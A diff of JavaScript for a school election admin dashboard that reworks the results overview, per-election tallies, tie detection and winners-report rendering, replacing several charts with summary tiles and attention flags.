+        (d.positions || []).forEach(p => {
+            const w = computeWinners(p);
+            if (w.tie) {
+                flags.push({
+                    tone: 'warn', icon: '⚠',
+                    text: `<strong>${escapeHtml(d.name)}</strong> — "${escapeHtml(p.title)}" is tied at ${w.cutoffVotes} vote${w.cutoffVotes===1?'':'s'}. There is no winner until you break the tie.`,
+                });
+            }
+        });
+        const anyVotes = (d.positions || []).some(p => (p.candidates || []).some(c => (c.vote_count || 0) > 0));
+        if (!anyVotes) {
+            flags.push({
+                tone: 'info', icon: '○',
+                text: `<strong>${escapeHtml(d.name)}</strong> has no ballots yet${d.status === 'scheduled' ? ' — it has not opened for voting' : ''}.`,
+            });
+        }
+    });
+
+    const flagsHtml = flags.length ? `
+    <div class="chart-card span-full">
+        <div class="chart-card-head"><h3 class="chart-card-title">Needs your attention</h3></div>
+        <p class="chart-card-sub">Things the numbers above cannot resolve on their own.</p>
+        <div class="ov-flags">
+            ${flags.slice(0, 8).map(f => `<div class="ov-flag ${f.tone}"><span class="flag-icon">${f.icon}</span><span>${f.text}</span></div>`).join('')}
+        </div>
+        ${flags.length > 8 ? `<p class="chart-legend-note">+ ${flags.length - 8} more</p>` : ''}
+    </div>` : '';
 
     el.innerHTML = resultsTabBar() + `
     <div class="card" style="margin-bottom:1.25rem;">
         <h2 class="section-title" style="margin-top:0;">Overview</h2>
-        <p class="muted" style="margin-top:-.5rem;">How the vote is actually landing, across every active election. This view is read-only â€” change student visibility or export a specific election from <strong>Election Detail</strong>.</p>
+        <p class="muted" style="margin-top:-.5rem;">The state of every open election at a glance. Candidate-level tallies and controls live in <strong>Election Detail</strong>.</p>
     </div>
     ${strip}
     <div class="chart-grid">
-        <div class="chart-card span-full">
-            <div class="chart-card-head"><h3 class="chart-card-title">Vote share by position</h3></div>
-            <p class="chart-card-sub">Every candidate in every active election, ranked within their position. Bar length is share of the votes cast in that position.</p>
-            <div class="chart-box tall"><canvas id="chartPositionShare"></canvas></div>
-        </div>
-        <div class="chart-card">
-            <div class="chart-card-head"><h3 class="chart-card-title">Turnout by election</h3></div>
-            <p class="chart-card-sub">Ballots cast against the students eligible to vote in that election's scope.</p>
-            <div class="chart-box"><canvas id="chartTurnout"></canvas></div>
-        </div>
-        <div class="chart-card">
-            <div class="chart-card-head"><h3 class="chart-card-title">Margin of victory</h3></div>
-            <p class="chart-card-sub">Winner's lead over the runner-up, in votes â€” the number that actually decides a result.</p>
-            <div class="chart-box"><canvas id="chartMargin"></canvas></div>
-        </div>
-        <div class="chart-card span-full" id="partyChartCard" style="display:none;">
-            <div class="chart-card-head"><h3 class="chart-card-title">Party breakdown</h3></div>
-            <p class="chart-card-sub">Only shown for elections with parties enabled.</p>
-            <div class="chart-box"><canvas id="chartParty"></canvas></div>
-            <div class="chip-legend" id="chartPartyLegend"></div>
-        </div>
+        ${table}
+        ${flagsHtml}
     </div>`;
 
-    drawPositionShareChart(details);
-    drawTurnoutChart(details);
-    drawMarginChart(details);
+    // Only the party chart belongs here — it is a genuine cross-election
+    // comparison (one ring, shared scale). Per-candidate bars and the
+    // turnout donut were removed: they were the "inside" view, duplicated in
+    // Election Detail, and the donut forced unrelated faculties onto one
+    // shared scale.
     drawPartyChart(details);
 }
 
-// One row per candidate. Chart.js needs an explicit pixel height, so the
-// bar charts size their box from the row count instead of relying on a
-// fixed CSS height â€” 11 candidates in 340px is unreadable.
-function sizeBarChartBox(canvas, rowCount, opts){
-    const box = canvas.closest('.chart-box');
-    if (!box) return;
-    const perRow = (opts && opts.perRow) || 34;
-    const padding = (opts && opts.padding) || 56;   // axis + legend space
-    const min = (opts && opts.min) || 200;
-    const max = (opts && opts.max) || 760;
-    const h = Math.min(max, Math.max(min, rowCount * perRow + padding));
-    box.style.height = h + 'px';
+// Truncates a long election name for a tile, without cutting mid-word when
+// possible.
+function shortName(name, max){
+    const s = String(name || '');
+    if (s.length <= max) return s;
+    const cut = s.slice(0, max);
+    const sp = cut.lastIndexOf(' ');
+    return (sp > max * 0.6 ? cut.slice(0, sp) : cut) + '…';
 }
 
-// Chart 1 â€” horizontal bars, one group per position, candidates ranked.
-function drawPositionShareChart(details){
-    const canvas = document.getElementById('chartPositionShare');
-    if (!canvas) return;
-
-    sizeBarChartBox(canvas, 0);   // reset before measuring the new row count
-
-    const rows = [];
-    details.forEach(d => {
-        (d.positions || []).forEach(p => {
-            const cands = (p.candidates || []).slice()
-                .sort((a,b) => (b.vote_count||0) - (a.vote_count||0));
-            if (!cands.length) return;
-            const total = cands.reduce((a,c) => a + (c.vote_count||0), 0);
-            const topVotes = cands[0].vote_count || 0;
-            const { winners } = computeWinners(p);
-            // Ties must not be coloured as though one candidate were
-            // genuinely ahead â€” computeWinners() is the same helper Reports
-            // uses, so a tie is flagged identically in both places.
-            const leaderIds = winners.map(w => w.id);
-            const tiedHere = (winners.length > 0)
-                && winners.every(w => (w.vote_count||0) === topVotes)
-                && (p.candidates || []).filter(c => (c.vote_count||0) === topVotes).length > (p.winner_count || 1);
-            cands.forEach(c => {
-                rows.push({
-                    label: `${p.title} â€” ${c.name}`,
-                    votes: c.vote_count || 0,
-                    pct: total > 0 ? (c.vote_count||0) / total * 100 : 0,
-                    leader: (c.vote_count || 0) === topVotes && topVotes > 0 && !tiedHere,
-                    tiedHere: tiedHere && (c.vote_count || 0) === topVotes,
-                    isWinner: leaderIds.includes(c.id),
-                });
-            });
-        });
-    });
-
-    if (!rows.length) {
-        chartShowEmpty(canvas, 'No candidates in any active election yet.');
-        return;
-    }
-
-    const t = chartTheme();
-    // Green = clear leader. Amber = tied at the top of this position.
-    // Everything else gets a muted neutral, so the eye lands on the
-    // contested positions instead of a different colour per candidate.
-    const barColor = r => r.leader ? '#65a30d' : r.tiedHere ? '#f59e0b' : '#94a3b8';
-
-    sizeBarChartBox(canvas, rows.length, { perRow: 34, padding: 60, min: 240, max: 900 });
-
-    resultsCharts.chartPositionShare = new Chart(canvas, {
-        type: 'bar',
-        data: {
-            labels: rows.map(r => r.label),
-            datasets: [{
-                label: 'Share of position votes (%)',
-                data: rows.map(r => Number(r.pct.toFixed(1))),
-                backgroundColor: rows.map(barColor),
-                borderRadius: 4,
-            }],
-        },
-        options: chartBaseOptions({
-            indexAxis: 'y',
-            plugins: {
-                legend: { display: false },
-                tooltip: {
-                    callbacks: {
-                        label: (ctx) => {
-                            const r = rows[ctx.dataIndex];
-                            const tag = r.tiedHere ? ' Â· tied â€” review needed'
-                                      : r.leader  ? ' Â· leading'
-                                      : r.isWinner ? ' Â· winner' : '';
-                            return ` ${r.votes} vote${r.votes===1?'':'s'} Â· ${r.pct.toFixed(1)}%${tag}`;
-                        },
-                    },
-                },
-            },
-            scales: {
-                x: { beginAtZero: true, max: 100, ticks: { color: t.text, callback: v => v + '%', font: { size: 11 } }, grid: { color: t.grid } },
-                y: { ticks: { color: t.text, font: { size: 10 } }, grid: { display: false } },
-            },
-        }),
-    });
-
-    // Ties are the one thing in this chart an admin must not misread, so
-    // they are called out in text, not only by colour. Appended to the CARD
-    // (not the canvas) because .chart-box has a fixed height and would clip it.
-    const notes = [];
-    if (rows.some(r => r.leader)) { notes.push('ðŸŸ© Green marks the clear leader in a position.'); }
-    if (rows.some(r => r.tiedHere)) {
-        notes.push('ðŸŸ  Amber marks a tie at the top of a position â€” these need a manual decision, same as in Reports.');
-    }
-    if (!rows.some(r => r.votes > 0)) { notes.push('No votes have been cast in these positions yet.'); }
-    if (notes.length) {
-        canvas.closest('.chart-card').insertAdjacentHTML(
-            'beforeend', notes.map(n => `<p class="chart-legend-note">${n}</p>`).join(''));
-    }
-}
-
-// Chart 2 â€” turnout donut per election.
-function drawTurnoutChart(details){
-    const canvas = document.getElementById('chartTurnout');
-    if (!canvas) return;
-
-    const withScope = details.filter(d => (d.eligible_voters || 0) > 0);
-    if (!withScope.length) {
-        chartShowEmpty(canvas, 'No active students to measure turnout against yet.');
-        return;
-    }
-
-    const labels = withScope.map(d => d.name.length > 26 ? d.name.slice(0,25) + 'â€¦' : d.name);
-    const cast = withScope.map(d => d.ballots_cast || 0);
-    const remaining = withScope.map((d,i) => Math.max(0, (d.eligible_voters || 0) - cast[i]));
-
-    resultsCharts.chartTurnout = new Chart(canvas, {
-        type: 'doughnut',
-        data: {
-            labels: withScope.flatMap(d => [`${d.name} â€” voted`, `${d.name} â€” not yet`]),
-            datasets: [{
-                label: 'Voters',
-                data: withScope.flatMap((d,i) => [cast[i], remaining[i]]),
-                backgroundColor: withScope.flatMap((d,i) => [CHART_COLORS[i % CHART_COLORS.length], '#e2e8f0']),
-                borderWidth: 2,
-                borderColor: document.documentElement.getAttribute('data-theme') === 'dark' ? '#1e293b' : '#ffffff',
-            }],
-        },
-        options: chartBaseOptions({
-            cutout: '58%',
-            scales: {},
-            plugins: {
-                tooltip: {
-                    callbacks: {
-                        label: (ctx) => {
-                            const i = Math.floor(ctx.dataIndex / 2);
-                            const d = withScope[i];
-                            return ` ${ctx.parsed} voter${ctx.parsed===1?'':'s'} Â· ${d.turnout_pct}% of eligible`;
-                        },
-                    },
-                },
-            },
-        }),
-    });
-}
-
-// Chart 3 â€” margin of victory per position, in votes.
-function drawMarginChart(details){
-    const canvas = document.getElementById('chartMargin');
-    if (!canvas) return;
-
-    const rows = [];
-    details.forEach(d => {
-        (d.positions || []).forEach(p => {
-            const { winners, tie } = computeWinners(p);
-            if (!winners.length) return;
-            const winner = winners[0];
-            const topVotes = winner.vote_count || 0;
-            // Compare against the best candidate who did NOT win. Using
-            // winners[0] alone would report a multi-winner seat as a huge
-            // margin when the runners-up are actually level with it.
-            const rest = (p.candidates || [])
-                .filter(c => c.id !== winner.id)
-                .sort((a,b) => (b.vote_count||0) - (a.vote_count||0));
-            const runnerUp = rest[0];
-            rows.push({
-                label: `${d.name.length > 18 ? d.name.slice(0,17)+'â€¦' : d.name} Â· ${p.title}`,
-                margin: runnerUp ? topVotes - (runnerUp.vote_count||0) : topVotes,
-                tie: !!tie,
-                // A position where only ONE candidate is standing isn't a
-                // landslide, it's a uncontested race â€” reported at full
-                // height would badly misrepresent it.
-                uncontested: (p.candidates || []).length <= 1,
-                noVotes: topVotes === 0,
-            });
-        });
-    });
-
-    if (!rows.length) {
-        chartShowEmpty(canvas, 'No decided positions to compare yet.');
-        return;
-    }
-
-    const t = chartTheme();
-
-    // A tie has a margin of exactly 0, which would draw a zero-length bar â€”
-    // i.e. the single most important row on this chart would render as
-    // nothing at all. Give tied and no-vote rows a hairline floor so they
-    // are visible, while the axis and the tooltip still report the true
-    // value. `suggestedMin` on the value axis keeps the scale honest.
-    const VISIBLE_FLOOR = 0.08;
-
-    // 44px minimum per row: with only 5 positions a smaller floor squeezes
-    // the bars to ~28px, where neighbouring bars stop being distinguishable.
-    sizeBarChartBox(canvas, rows.length, { perRow: 44, padding: 60, min: 240, max: 640 });
-
-    resultsCharts.chartMargin = new Chart(canvas, {
-        type: 'bar',
-        data: {
-            labels: rows.map(r => r.label),
-            datasets: [{
-                label: 'Margin (votes)',
-                data: rows.map(r => r.margin),
-                backgroundColor: rows.map(r =>
-                    r.tie ? '#dc2626'
-                    : r.uncontested ? '#94a3b8'
-                    : r.noVotes ? '#cbd5e1'
-                    : '#3b82f6'),
-                borderRadius: 4,
-                // Applies only to the rows whose real value is 0.
-                minBarLength: VISIBLE_FLOOR,
-            }],
-        },
-        options: chartBaseOptions({
-            indexAxis: 'y',
-            plugins: {
-                legend: { display: false },
-                tooltip: {
-                    callbacks: {
-                        label: (ctx) => {
-                            const r = rows[ctx.dataIndex];
-                            if (r.tie) return ' TIE â€” review needed (see Reports)';
-                            if (r.uncontested) return ' Uncontested â€” only one candidate stood';
-                            if (r.noVotes) return ' No votes cast yet';
-                            return ` Won by ${ctx.parsed} vote${ctx.parsed===1?'':'s'}`;
-                        },
-                    },
-                },
-            },
-            scales: {
-                x: { beginAtZero: true, suggestedMax: rows.length ? Math.max(1, ...rows.map(r => r.margin)) * 1.15 : 1, ticks: { color: t.text, font: { size: 11 } }, grid: { color: t.grid } },
-                y: { ticks: { color: t.text, font: { size: 10 } }, grid: { display: false } },
-            },
-        }),
-    });
-
-    const notes = [];
-    if (rows.some(r => r.tie)) {
-        notes.push('ðŸ”´ Red marks a tie â€” the top candidates are level on votes and need a manual decision.');
-    }
-    if (rows.some(r => r.uncontested)) {
-        notes.push('â¬œ Grey marks an uncontested position â€” only one candidate stood, so the bar is not a popularity result.');
-    }
-    if (rows.some(r => r.noVotes)) {
-        notes.push('â¬« Very light marks a position where no votes have been cast yet.');
-    }
-    if (notes.length) {
-        canvas.closest('.chart-card').insertAdjacentHTML(
-            'beforeend', notes.map(n => `<p class="chart-legend-note">${n}</p>`).join(''));
-    }
-}
-
-// Chart 4 â€” party breakdown, only when some election actually has parties.
+// Chart 4 — party breakdown, only when some election actually has parties.
 function drawPartyChart(details){
     const card = document.getElementById('partyChartCard');
     const canvas = document.getElementById('chartParty');
@@ -3321,7 +3282,7 @@ function drawPartyChart(details){
         });
     });
 
-    if (!any) return;   // stays hidden â€” an empty party chart is noise
+    if (!any) return;   // stays hidden — an empty party chart is noise
     card.style.display = '';
 
     const names = Object.keys(totals).sort((a,b) => totals[b] - totals[a]);
@@ -3345,16 +3306,17 @@ function drawPartyChart(details){
     const legend = document.getElementById('chartPartyLegend');
     if (legend) {
         legend.innerHTML = names.map((n,i) =>
-            `<span class="chip"><span class="swatch" style="background:${CHART_COLORS[i % CHART_COLORS.length]}"></span>${escapeHtml(n)} Â· ${totals[n]}</span>`
+            `<span class="chip"><span class="swatch" style="background:${CHART_COLORS[i % CHART_COLORS.length]}"></span>${escapeHtml(n)} · ${totals[n]}</span>`
         ).join('');
     }
 }
 
 // ------------------------------------------------------------------
-// ELECTION DETAIL â€” the tallies, plus the controls that change something
+// ELECTION DETAIL — the tallies, plus the controls that change something
 // ------------------------------------------------------------------
 async function renderDetailView(focusId){
     const el = document.getElementById('panel-results');
+
     el.innerHTML = `
         <div class="skeleton skel-line w40" style="height:16px;"></div>
         ${'<div class="skeleton skel-card"></div>'.repeat(2)}
@@ -3362,7 +3324,7 @@ async function renderDetailView(focusId){
     try {
         const res = await fetch(ELECTIONS_API);
         const allElections = await res.json();
-        // Archived elections don't clutter the general Results view â€” view
+        // Archived elections don't clutter the general Results view — view
         // their results from the Archive tab instead (same underlying data,
         // just scoped to one election via focusId below).
         const elections = focusId
@@ -3387,11 +3349,40 @@ async function renderDetailView(focusId){
                 const visibleToStudents = detail.results_visibility === 'always'
                     || (detail.results_visibility === 'after' && (detail.status === 'closed' || detail.status === 'archived'));
 
+                // Per-election figures. Each one states what it counts, and the
+                // turnout tile says WHICH population the denominator is — a
+                // DSG election is only open to its own faculty, so "0 of 2
+                // eligible" is only meaningful next to that fact.
+                const scope = detail.type === 'DSG'
+                    ? `${detail.department || 'this faculty'} students`
+                    : 'all active students school-wide';
+                const posList = detail.positions || [];
+                const decidedCount = posList.filter(p => (p.candidates||[]).some(c => (c.vote_count||0) > 0)).length;
+                const tieCount = posList.filter(p => computeWinners(p).tie).length;
                 const turnoutPct = detail.turnout_pct || 0;
-                const turnout = `<div class="stat-tile" style="margin:.9rem 0 0;">
-                    <div class="k">Turnout</div>
-                    <div class="v">${turnoutPct}%</div>
-                    <div class="s">${detail.ballots_cast||0} of ${detail.eligible_voters||0} eligible voters</div>
+                const meterCls = turnoutPct === 0 ? 'none' : turnoutPct < 30 ? 'low' : '';
+                const turnoutTone = turnoutPct === 0 ? 'tone-neutral' : turnoutPct < 30 ? 'tone-warn' : 'tone-good';
+
+                const figures = `
+                <div class="stat-strip" style="margin-top:1rem;margin-bottom:0;">
+                    <div class="stat-tile ${turnoutTone}">
+                        <div class="k">Turnout</div>
+                        <div class="v">${turnoutPct}%</div>
+                        <div class="s">${detail.ballots_cast || 0} of ${detail.eligible_voters || 0} people voted</div>
+                        <div class="hint">Eligible means ${escapeHtml(scope)}</div>
+                    </div>
+                    <div class="stat-tile tone-neutral">
+                        <div class="k">Positions</div>
+                        <div class="v">${posList.length}</div>
+                        <div class="s">${decidedCount} ${decidedCount === 1 ? 'has' : 'have'} votes recorded</div>
+                        <div class="hint">${tieCount ? `${tieCount} tied — needs a manual decision` : 'No ties'}</div>
+                    </div>
+                    <div class="stat-tile tone-neutral">
+                        <div class="k">Votes cast</div>
+                        <div class="v">${detail.vote_count || 0}</div>
+                        <div class="s">Across all ${posList.length} positions</div>
+                        <div class="hint">One vote per person per position, so this is larger than the ballot count</div>
+                    </div>
                 </div>`;
 
                 html += `
@@ -3402,11 +3393,9 @@ async function renderDetailView(focusId){
                             <span class="status-large ${statusClass(detail.status)}" style="margin-top:.4rem;"><span class="status-dot"></span>${statusLabel(detail.status)}</span>
                             ${syBadgeHtml(detail.target_school_year_label)}
                         </div>
-                        <button class="btn btn-secondary btn-sm" onclick="exportResultsCSV(electionDetailsCache[${detail.id}])">â¬‡ Export CSV</button>
+                        <button class="btn btn-secondary btn-sm" onclick="exportResultsCSV(electionDetailsCache[${detail.id}])">⬇ Export CSV</button>
                     </div>
-                    <div class="stat-strip" style="grid-template-columns:repeat(auto-fit,minmax(130px,1fr));margin-top:1rem;margin-bottom:0;">${turnout}
-                        <div class="stat-tile"><div class="k">Positions</div><div class="v">${(detail.positions||[]).length}</div><div class="s">${detail.vote_count||0} votes recorded</div></div>
-                    </div>
+                    ${figures}
                     <div class="results-visibility-row" style="margin-top:1rem;">
                         <span class="vis-label">Student visibility:</span>
                         ${visibilityButtons(detail.id, detail.results_visibility)}
@@ -3418,28 +3407,59 @@ async function renderDetailView(focusId){
                 if (!positions.length) {
                     html += '<p class="muted">No positions set up yet.</p>';
                 }
-                positions.forEach(pos => {
+
+                // This is the "inside" view — the per-candidate bar chart
+                // that used to sit on the Overview. Rendered into a
+                // dedicated container per election and drawn after the HTML
+                // lands, so Chart.js sizes against a canvas that is already
+                // in the document.
+                positions.forEach((pos, posIdx) => {
                     const cands = pos.candidates || [];
                     const total = cands.reduce((a,c) => a + (c.vote_count || 0), 0);
-                    const yearNote = pos.year_restriction ? ` <span class="muted" style="font-size:.75rem;font-weight:400;">â€” visible only to ${escapeHtml(pos.year_restriction)}</span>` : '';
-                    html += `<div style="margin-bottom:1.25rem;"><h4 style="margin:0 0 .5rem;font-size:.95rem;">${escapeHtml(pos.title)}${yearNote}</h4>`;
+                    const yearNote = pos.year_restriction ? ` <span class="muted" style="font-size:.75rem;font-weight:400;">— visible only to ${escapeHtml(pos.year_restriction)}</span>` : '';
+                    const tie = computeWinners(pos).tie;
+                    const uncontested = cands.length === 1;
+                    const topVotes = cands.length ? Math.max(...cands.map(c => c.vote_count || 0)) : 0;
+                    const leaders = cands.filter(c => (c.vote_count || 0) === topVotes && topVotes > 0);
+                    const seats = pos.winner_count || 1;
+
+                    html += `<div style="margin-bottom:1.5rem;">
+                        <div class="report-row" style="padding-top:0;border-bottom:none;">
+                            <h4 style="margin:0;font-size:.95rem;">${escapeHtml(pos.title)}${yearNote}</h4>
+                            <span class="muted" style="font-size:.76rem;">
+                                ${total} vote${total===1?'':'s'} cast · ${seats > 1 ? `${seats} winner${seats===1?'':'s'}` : '1 winner'}
+                                ${tie ? ' · <span class="status-pill suspended">TIE</span>' : ''}
+                                ${uncontested ? ' · <span class="status-pill normal">UNCONTESTED</span>' : ''}
+                            </span>
+                        </div>`;
+
                     if (!cands.length) {
-                        html += '<p class="muted">No candidates.</p>';
+                        html += '<p class="muted">No candidates on this position.</p>';
                     } else {
+                        // No per-position chart here. The rows above already
+                        // carry every candidate's count, share and progress
+                        // bar, so a chart directly beneath them restates the
+                        // same numbers for ~150px of vertical space. Charts
+                        // are reserved for the Overview, where they compare
+                        // things a list of rows cannot.
                         cands.forEach(c => {
                             const votes = c.vote_count || 0;
                             const pct = total > 0 ? Math.round((votes/total)*100) : 0;
-                            const candMeta = [c.department, c.candidate_year].filter(Boolean).join(' Â· ');
+                            const isLeader = topVotes > 0 && votes === topVotes;
+                            const candMeta = [c.department, c.candidate_year].filter(Boolean).join(' · ');
                             html += `
                             <div class="result-row">
                                 <div class="result-header">
-                                    <span>${escapeHtml(c.name)} ${c.party && c.party !== 'No Party / Independent' ? `<span class="muted">Â· ${escapeHtml(c.party)}</span>` : ''}</span>
+                                    <span>${isLeader ? '<span style="color:var(--lime-dark);font-weight:700;" title="Currently leading">&#9733;</span> ' : ''}${escapeHtml(c.name)} ${c.party && c.party !== 'No Party / Independent' ? `<span class="muted">· ${escapeHtml(c.party)}</span>` : ''}</span>
                                     <span>${votes} vote${votes===1?'':'s'} (${pct}%)</span>
                                 </div>
                                 ${candMeta ? `<div class="muted" style="font-size:.76rem;margin-top:.1rem;">${escapeHtml(candMeta)}</div>` : ''}
                                 <div class="progress-bar-track"><div class="progress-bar-fill" style="width:${pct}%;"></div></div>
                             </div>`;
                         });
+                        if (uncontested) {
+                            html += '<p class="chart-legend-note">Uncontested — only one candidate stood.</p>';
+                        }
                     }
                     html += '</div>';
                 });
@@ -3451,16 +3471,16 @@ async function renderDetailView(focusId){
         el.innerHTML = html;
     } catch (e) {
         el.innerHTML = '<div class="alert alert-error">Could not load results.</div>';
-    }
-}
+      }
+  }
 
 // ------------------------------------------------------------------
-// REPORTS â€” winners-only SSG/DSG reports, grouped by an election's
-// target_school_year (who these officers will actually serve â€” NOT the
+// REPORTS — winners-only SSG/DSG reports, grouped by an election's
+// target_school_year (who these officers will actually serve — NOT the
 // raw election dates, since an election held during 2026-2027 is
 // normally FOR 2027-2028). Print preview opens a clean new tab; Export
 // buttons produce a real .xlsx (via SheetJS, loaded in <head>) and a
-// Word-openable .doc (an HTML document served with the Word MIME type â€”
+// Word-openable .doc (an HTML document served with the Word MIME type —
 // no library needed, and Word opens it natively).
 // ------------------------------------------------------------------
 let reportType = 'SSG'; // 'SSG' | 'DSG'
@@ -3468,12 +3488,17 @@ let reportTargetSchoolYearId = null;
 
 // Sorts candidates by votes desc, takes the top winner_count as winners,
 // and flags a tie when the candidate just outside the cutoff has the
-// same vote count as the last winner â€” that's a real ambiguity an admin
+// same vote count as the last winner — that's a real ambiguity an admin
 // needs to resolve by hand, not something to silently pick a winner for.
 function computeWinners(position){
     const cands = (position.candidates || []).slice().sort((a,b) => (b.vote_count||0) - (a.vote_count||0));
     const winnerCount = position.winner_count || 1;
     if (!cands.length) return { winners: [], tie: false, cutoffVotes: 0 };
+    // Zero votes cast (or an election that hasn't ended): naming the
+    // first N candidates as "winners" would print people as elected
+    // who never were. Report "no votes cast" instead.
+    const totalVotes = cands.reduce((a,c) => a + (c.vote_count||0), 0);
+    if (!totalVotes) return { winners: [], tie: false, cutoffVotes: 0, noVotes: true };
     const cutoffIdx = Math.min(winnerCount, cands.length) - 1;
     const cutoffVotes = cands[cutoffIdx].vote_count || 0;
     const winners = cands.slice(0, winnerCount);
@@ -3487,7 +3512,7 @@ function computeWinners(position){
 // DSG report naturally reads as "one block per faculty".
 function buildReportSections(details){
     return details.map(detail => ({
-        heading: detail.type === 'DSG' ? `${detail.department || 'Faculty'} â€” ${detail.name}` : detail.name,
+        heading: detail.type === 'DSG' ? `${detail.department || 'Faculty'} — ${detail.name}` : detail.name,
         electionName: detail.name,
         positions: (detail.positions || []).map(p => {
             const { winners, tie } = computeWinners(p);
@@ -3533,7 +3558,7 @@ async function renderReportsView(){
         </div>`;
 
     const listHtml = matching.length
-        ? `<ul class="insight-list">${matching.map(e => `<li>${escapeHtml(e.name)}${e.type==='DSG' ? ' â€” ' + escapeHtml(e.department||'') : ''} <span class="status-large ${statusClass(e.status)}" style="transform:scale(.8);display:inline-flex;"><span class="status-dot"></span>${statusLabel(e.status)}</span></li>`).join('')}</ul>`
+        ? `<ul class="insight-list">${matching.map(e => `<li>${escapeHtml(e.name)}${e.type==='DSG' ? ' — ' + escapeHtml(e.department||'') : ''} <span class="status-large ${statusClass(e.status)}" style="transform:scale(.8);display:inline-flex;"><span class="status-dot"></span>${statusLabel(e.status)}</span></li>`).join('')}</ul>`
         : `<p class="muted">No ${reportType} elections are targeted at this school year yet.</p>`;
 
     el.innerHTML = `
@@ -3549,11 +3574,11 @@ async function renderReportsView(){
                 <button class="btn btn-primary" ${!matching.length?'disabled':''} onclick="generateReport()">Generate Report</button>
             </div>
         </div>
-        <div id="reportPreviewArea" style="margin-top:1.5rem;"></div>
+        <div id="reportPreviewArea" class="report-preview" style="margin-top:1.5rem;"></div>
     `;
 }
 
-let lastReportData = null; // { type, schoolYearLabel, sections } â€” reused by print/export buttons
+let lastReportData = null; // { type, schoolYearLabel, sections } — reused by print/export buttons
 
 async function generateReport(){
     const previewArea = document.getElementById('reportPreviewArea');
@@ -3565,7 +3590,7 @@ async function generateReport(){
     const matching = allElections.filter(e => e.type === reportType && String(e.target_school_year_id) === String(reportTargetSchoolYearId));
 
     if (!matching.length) {
-        previewArea.innerHTML = '<div class="alert alert-warning">Nothing to report â€” no matching elections.</div>';
+        previewArea.innerHTML = '<div class="alert alert-warning">Nothing to report — no matching elections.</div>';
         return;
     }
 
@@ -3592,16 +3617,24 @@ function renderReportPreview(){
     const { type, schoolYearLabel, sections, anyUnfinished } = lastReportData;
 
     const anyTies = sections.some(s => s.positions.some(p => p.tie));
+    const totalWinners = sections.reduce((a, s) => a + s.positions.reduce((b, p) => b + p.winners.length, 0), 0);
 
+    // Colours come from CSS tokens (redefined for [data-theme="dark"]) via
+    // the .report-* classes. The previous version inlined color:var(--navy),
+    // and --navy is not defined in this stylesheet — it fell back to the
+    // browser default, which is near-black on the dark card, so election
+    // headings were invisible in dark mode.
     const sectionsHtml = sections.map(sec => `
         <div style="margin-bottom:1.5rem;">
-            <h4 style="margin:0 0 .6rem;font-size:.95rem;color:var(--navy);">${escapeHtml(sec.heading)}</h4>
+            <h4>${escapeHtml(sec.heading)}</h4>
             ${sec.positions.map(p => `
-                <div style="display:flex;justify-content:space-between;gap:1rem;padding:.5rem 0;border-bottom:1px solid var(--border-soft);">
-                    <span style="font-weight:600;">${escapeHtml(p.title)}</span>
-                    <span style="text-align:right;">
-                        ${p.winners.length ? p.winners.map(w => escapeHtml(w.name)).join(', ') : '<span class="muted">No candidates</span>'}
-                        ${p.tie ? ' <span class="status-pill suspended">TIE â€” review needed</span>' : ''}
+                <div class="report-row">
+                    <span class="pos">${escapeHtml(p.title)}</span>
+                    <span class="who">
+                        ${p.winners.length
+                            ? p.winners.map(w => escapeHtml(w.name)).join(', ')
+                            : '<span class="who-none">No candidates on this position</span>'}
+                        ${p.tie ? ' <span class="status-pill suspended">TIE — needs review</span>' : ''}
                     </span>
                 </div>
             `).join('')}
@@ -3611,39 +3644,49 @@ function renderReportPreview(){
     previewArea.innerHTML = `
         <div class="card">
             <div class="panel-flex-header">
-                <h3 style="margin:0;">${type} Winners â€” ${escapeHtml(schoolYearLabel)}</h3>
+                <h3 style="margin:0;">${type} Winners — ${escapeHtml(schoolYearLabel)}</h3>
                 <div style="display:flex;gap:.5rem;flex-wrap:wrap;">
-                    <button class="btn btn-secondary btn-sm" onclick="openReportPrintPreview()">ðŸ–¨ Print Preview</button>
-                    <button class="btn btn-secondary btn-sm" onclick="saveReportAsPDF()">â¬‡ Save as PDF</button>
-                    <button class="btn btn-secondary btn-sm" onclick="exportReportXLSX()">â¬‡ Export XLSX</button>
-                    <button class="btn btn-secondary btn-sm" onclick="exportReportDoc()">â¬‡ Export DOC</button>
+                    <button class="btn btn-secondary btn-sm" onclick="openReportPrintPreview()">🖨 Print Preview</button>
+                    <button class="btn btn-secondary btn-sm" onclick="saveReportAsPDF()">⬇ Save as PDF</button>
+                    <button class="btn btn-secondary btn-sm" onclick="exportReportXLSX()">⬇ Export XLSX</button>
+                    <button class="btn btn-secondary btn-sm" onclick="exportReportDoc()">⬇ Export DOC</button>
                 </div>
             </div>
-            <p class="muted" style="font-size:.76rem;margin:.5rem 0 0;">"Save as PDF" opens the same print view â€” choose <strong>Save as PDF</strong> as the destination and turn off headers/footers for a clean document.</p>
-            ${anyTies ? '<div class="alert alert-warning">One or more positions are tied â€” review flagged positions before finalizing.</div>' : ''}
-            ${anyUnfinished ? '<div class="alert alert-info">One or more included elections haven\u2019t ended yet â€” this reflects current vote counts, not final results.</div>' : ''}
+            <p class="muted" style="font-size:.76rem;margin:.5rem 0 0;">"Save as PDF" opens the same print view — choose <strong>Save as PDF</strong> as the destination and turn off headers/footers for a clean document.</p>
+            ${anyTies ? '<div class="alert alert-warning">One or more positions are tied — review flagged positions before finalizing.</div>' : ''}
+            ${anyUnfinished ? '<div class="alert alert-info">One or more included elections haven\u2019t ended yet — this reflects current vote counts, not final results.</div>' : ''}
             ${sectionsHtml}
         </div>
     `;
 }
 
+/**
+ * The printable / PDF / DOC document.
+ *
+ * This is deliberately a winners list and nothing else: no vote counts, no
+ * generation timestamp, no margins-of-victory. It answers one question — who
+ * won what — and every extra figure makes a circulated result document look
+ * like preliminary data.
+ *
+ * The on-screen hint is hidden by CSS because this same markup is what gets
+ * printed; showing it would repeat on every page.
+ */
 function reportPrintableHTML(){
     const { type, schoolYearLabel, sections } = lastReportData;
-    const title = `${type} Winners Report â€” ${schoolYearLabel}`;
+    const title = `${type} Winners Report — ${schoolYearLabel}`;
+
     const sectionsHtml = sections.map(sec => `
-        <h3 style="margin:1.5rem 0 .5rem;font-size:1rem;border-bottom:2px solid #0b2545;padding-bottom:.3rem;">${escapeHtml(sec.heading)}</h3>
-        <table style="width:100%;border-collapse:collapse;margin-bottom:.5rem;">
+        <h3>${escapeHtml(sec.heading)}</h3>
+        <table>
             <thead><tr>
-                <th style="text-align:left;border-bottom:1px solid #ccc;padding:.4rem;">Position</th>
-                <th style="text-align:left;border-bottom:1px solid #ccc;padding:.4rem;">Winner(s)</th>
